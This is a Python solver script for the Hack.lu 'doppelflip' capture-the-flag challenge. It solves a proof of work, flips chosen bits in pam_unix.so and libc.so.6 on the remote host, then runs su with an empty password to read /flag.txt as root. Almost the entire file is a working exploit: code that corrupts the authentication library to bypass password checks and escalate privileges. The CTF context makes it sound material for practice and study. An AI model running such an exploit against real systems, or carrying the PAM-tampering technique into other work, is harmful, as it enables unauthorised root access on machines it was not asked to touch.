#!/usr/bin/env python3
"""Solver for HackLu misc/doppelflip.

The two file/byte/bit triples are tied to the Ubuntu image digest in the
challenge Dockerfile. The script intentionally waits for the post-exec
banner before sending shell input; otherwise scanf() may consume it.
"""

import hashlib
import re
import socket
import sys


DEFAULT_HOST = "doppelflip.flu.xxx"
DEFAULT_PORT = 1337


def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("remote closed the connection")
        data.extend(chunk)
    return bytes(data)


def solve_pow(prefix: str, wanted: str) -> str:
    number = 0
    while True:
        candidate = f"{prefix}{number}"
        digest = hashlib.sha256(candidate.encode()).hexdigest()
        if digest.startswith(wanted):
            return candidate
        number += 1


def main() -> None:
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    with socket.create_connection((host, port), timeout=30) as sock:
        sock.settimeout(300)
        prompt = recv_until(sock, b"PoW:")
        match = re.search(
            rb"starts with ([0-9a-f]+).*?hash starts with ([0-9a-f]+)",
            prompt,
            re.DOTALL,
        )
        if not match:
            raise RuntimeError(f"could not parse PoW prompt: {prompt!r}")

        prefix = match.group(1).decode()
        wanted = match.group(2).decode()
        answer = solve_pow(prefix, wanted)
        print(f"[+] PoW: {answer}")
        sock.sendall(answer.encode() + b"\n")

        recv_until(sock, b"Flip 1:")
        payload = (
            b"/lib/x86_64-linux-gnu/security/pam_unix.so\n"
            b"36916\n"
            b"0\n"
            b"/lib/x86_64-linux-gnu/libc.so.6\n"
            b"1947540\n"
            b"4\n"
        )
        sock.sendall(payload)

        banner = recv_until(sock, b"Flipping & starting")
        print(banner.decode(errors="replace"), end="")

        command = b"printf '\\n' | su -c 'id; cat /flag.txt' 2>&1\nexit\n"
        sock.sendall(command)

        while True:
            try:
                chunk = sock.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            print(chunk.decode(errors="replace"), end="")


if __name__ == "__main__":
    main()

